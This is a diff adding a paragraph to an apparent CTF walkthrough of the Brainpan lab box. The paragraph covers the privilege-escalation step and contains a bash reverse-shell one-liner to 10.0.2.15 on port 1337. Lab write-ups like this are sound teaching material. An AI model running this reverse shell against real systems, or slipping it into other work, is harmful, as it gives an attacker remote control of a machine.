@@ -203,6 +203,10 @@ Doing the same but for the brainpan box gives us a shell with the user **puck**
 ## Privilege escalation 
 ---
 
-As you have probably guessed the remote 
+As we have already noticed the remote host is actually a Linux box running **cmd** through wine. Running `/bin/bash` in the given terminal and typing bash commands work sometimes but sometimes it doesn't. Wine seems to switch between Linux and Windows mode. This isn't practical so let's try to send a linux terminal back to us on port **1337** with `bash -i >& /dev/tcp/10.0.2.15/1337 0>&1`.
+
+Typing this command in the given shell and in parallel listenining at port **1337** in our box returns a proper linux shell at us. ( I tried 2 or 3 times to get this to work).
+
+
 
 
